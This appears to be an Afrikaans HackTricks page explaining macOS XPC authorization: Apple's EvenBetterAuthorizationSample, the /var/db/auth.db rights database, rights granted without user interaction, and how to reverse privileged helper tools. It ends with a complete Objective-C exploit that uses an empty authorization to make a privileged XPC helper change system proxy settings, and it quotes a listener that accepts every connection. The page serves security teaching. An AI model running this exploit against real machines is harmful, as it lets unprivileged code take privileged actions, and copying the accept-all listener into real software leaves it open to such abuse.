# macOS XPC-gemagtiging

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## XPC-gemagtiging

Apple stel ook 'n ander manier voor om te verifieer of die verbindende proses **toestemmings het om die blootgestelde XPC-metode te roep**.

Wanneer 'n aansoek **handelinge moet uitvoer as 'n bevoorregte gebruiker**, installeer dit gewoonlik in plaas daarvan die aansoek as 'n bevoorregte gebruiker 'n HelperTool as 'n XPC-diens wat van die aansoek geroep kan word om daardie handelinge uit te voer. Die aansoek wat die diens roep, moet egter genoeg gemagtiging hê.

### ShouldAcceptNewConnection altyd JA

'n Voorbeeld kan gevind word in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` probeer dit om te **verbind** met die **HelperTool**. En in `HelperTool/HelperTool.m` sal die funksie **`shouldAcceptNewConnection`** **nie enige van die vooraf aangeduide vereistes nagaan nie**. Dit sal altyd JA teruggee:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Vir meer inligting oor hoe om hierdie kontrole behoorlik te konfigureer:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### Aansoekregte

Daar is egter enige **magtiging wat plaasvind wanneer 'n metode van die HelperTool geroep word**.

Die funksie **`applicationDidFinishLaunching`** van `App/AppDelegate.m` sal 'n leë magtigingsverwysing skep nadat die aansoek begin het. Dit behoort altyd te werk.\
Daarna sal dit probeer om **sekere regte by daardie magtigingsverwysing toe te voeg** deur `setupAuthorizationRights` te roep:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die funksie `setupAuthorizationRights` van `Common/Common.m` sal die regte van die aansoek stoor in die outorisasiedatabasis `/var/db/auth.db`. Let op hoe dit slegs die regte sal byvoeg wat nog nie in die databasis is nie:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die funksie `enumerateRightsUsingBlock` is die een wat gebruik word om aansoeke se regte te kry, wat gedefinieer is in `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Dit beteken dat aan die einde van hierdie proses, die toestemmings wat binne `commandInfo` verklaar is, in `/var/db/auth.db` gestoor sal word. Let daarop dat jy vir **elke metode** wat **verifikasie vereis**, die **toestemmingsnaam** en die **`kCommandKeyAuthRightDefault`** kan vind. Die laaste een **dui aan wie hierdie reg kan verkry**.

Daar is verskillende omvang om aan te dui wie 'n reg kan verkry. Sommige van hulle is gedefinieer in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) (jy kan [al hulle hier vind](https://www.dssw.co.uk/reference/authorization-rights/)), maar as 'n opsomming:

<table><thead><tr><th width="284.3333333333333">Naam</th><th width="165">Waarde</th><th>Beskrywing</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Enigiemand</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Huidige gebruiker moet 'n administrateur wees (binne administrateursgroep)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Vra gebruiker om te verifieer.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Vra gebruiker om te verifieer. Hy moet 'n administrateur wees (binne administrateursgroep)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Spesifiseer reëls</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Spesifiseer ekstra opmerkings oor die reg</td></tr></tbody></table>

### Regte Verifikasie

In `HelperTool/HelperTool.m` kontroleer die funksie **`readLicenseKeyAuthorization`** of die oproeper gemagtig is om **so 'n metode** uit te voer deur die funksie **`checkAuthorization`** te roep. Hierdie funksie sal die **authData** wat deur die oproepende proses gestuur is, nagaan vir 'n **korrekte formaat** en dan sal dit nagaan **wat nodig is om die reg te verkry** om die spesifieke metode te roep. As alles goed verloop, sal die **teruggekeerde `fout` `nil` wees**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Merk op dat om **die vereistes te kontroleer om die reg** te kry om daardie metode te roep, sal die funksie `authorizationRightForCommand` net die voorheen kommentaarobjek **`commandInfo`** kontroleer. Dan sal dit **`AuthorizationCopyRights`** roep om te kontroleer **of dit die regte het** om die funksie te roep (merk op dat die vlae interaksie met die gebruiker toelaat).

In hierdie geval, om die funksie `readLicenseKeyAuthorization` te roep, is `kCommandKeyAuthRightDefault` omskryf as `@kAuthorizationRuleClassAllow`. So **enigiemand kan dit roep**.

### DB Inligting

Daar is genoem dat hierdie inligting gestoor word in `/var/db/auth.db`. Jy kan al die gestoorde reëls lys met:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dan kan jy lees wie die reg kan benader met:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Toelaatbare regte

Jy kan **al die toestemmingskonfigurasies** [**hier**](https://www.dssw.co.uk/reference/authorization-rights/) vind, maar die kombinasies wat nie gebruikerinteraksie vereis nie, is:

1. **'authenticate-user': 'false'**
* Hierdie is die mees direkte sleutel. Indien ingestel op `false`, dui dit aan dat 'n gebruiker nie verifikasie hoef te verskaf om hierdie reg te verkry nie.
* Dit word gebruik in **kombinasie met een van die 2 onderstaande of deur 'n groep aan te dui** waarvan die gebruiker deel moet wees.
2. **'allow-root': 'true'**
* Indien 'n gebruiker as die root-gebruiker optree (wat verhoogde regte het) en hierdie sleutel op `true` ingestel is, kan die root-gebruiker moontlik hierdie reg verkry sonder verdere verifikasie. Gewoonlik vereis die bereiking van 'n root-gebruikerstatus egter reeds verifikasie, dus is dit nie 'n "geen verifikasie" scenario vir die meeste gebruikers nie.
3. **'session-owner': 'true'**
* Indien ingestel op `true`, sal die eienaar van die sessie (die tans ingeteken gebruiker) hierdie reg outomaties verkry. Dit mag verdere verifikasie omseil indien die gebruiker reeds ingeteken is.
4. **'shared': 'true'**
* Hierdie sleutel verleen nie regte sonder verifikasie nie. Indien op `true` ingestel, beteken dit dat sodra die reg ge-verifieer is, dit gedeel kan word tussen verskeie prosesse sonder dat elkeen weer moet verifieer nie. Maar die aanvanklike toekenning van die reg sal steeds verifikasie vereis tensy dit gekombineer word met ander sleutels soos `'authenticate-user': 'false'`.

Jy kan [**hierdie skripsie**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) gebruik om die interessante regte te kry:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Omgekeerde Autorisasie

### Kontroleer of EvenBetterAuthorization gebruik word

As jy die funksie vind: **`[HelperTool checkAuthorization:command:]`** is dit waarskynlik dat die proses die voorheen genoemde skema vir autorisasie gebruik:

<figure><img src="../../../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

As hierdie funksie funksies soos `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` aanroep, gebruik dit [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Kyk na die **`/var/db/auth.db`** om te sien of dit moontlik is om toestemming te kry om 'n bevoorregte aksie uit te voer sonder gebruikerinteraksie.

### Protokol Kommunikasie

Daarna moet jy die protokolskema vind om kommunikasie met die XPC-diens te kan vestig.

Die funksie **`shouldAcceptNewConnection`** dui die uitgevoerde protokol aan:

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

In hierdie geval het ons dieselfde as in EvenBetterAuthorizationSample, [**kontroleer hierdie lyn**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Deur die naam van die gebruikte protokol te ken, is dit moontlik om **die kopdefinisie daarvan te dump** met:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Laastens, ons moet net die **naam van die blootgestelde Mach-diens** weet om 'n kommunikasie daarmee te vestig. Daar is verskeie maniere om dit te vind:

* In die **`[HelperTool init()]`** waar jy kan sien watter Mach-diens gebruik word:

<figure><img src="../../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

* In die launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Uitbuitingsvoorbeeld

In hierdie voorbeeld is geskep:

* Die definisie van die protokol met die funksies
* 'n Leë outentifisering om te gebruik om toegang te vra
* 'n Verbinding met die XPC-diens
* 'n Oproep na die funksie as die verbinding suksesvol was
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Verwysings

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
